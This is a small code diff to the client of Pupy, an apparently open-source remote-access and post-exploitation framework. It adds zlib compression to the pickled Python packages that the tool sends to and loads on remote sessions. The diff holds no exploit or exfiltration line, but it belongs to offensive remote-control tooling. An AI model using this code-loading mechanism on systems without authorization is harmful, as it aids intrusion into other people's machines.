@@ -23,6 +23,7 @@ import textwrap
 from .PupyPackagesDependencies import packages_dependencies, LOAD_PACKAGE, LOAD_DLL, EXEC, ALL_OS, WINDOWS, LINUX, ANDROID
 from .PupyJob import PupyJob
 from zipfile import ZipFile
+import zlib
 import marshal
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
@@ -456,7 +457,10 @@ class PupyClient(object):
         # we have to pickle the dic for two reasons : because the remote side is
         # not aut0horized to iterate/access to the dictionary declared on this
         # side and because it is more efficient
-        pupyimporter.pupy_add_package(cPickle.dumps(modules_dic))
+        pupyimporter.pupy_add_package(
+            zlib.compress(cPickle.dumps(modules_dic), 9),
+            compressed=True
+        )
         logging.debug("package %s loaded on %s from path=%s"%(module_name, self.short_name(), package_path))
         if update:
             self.conn.modules.__invalidate__(module_name)
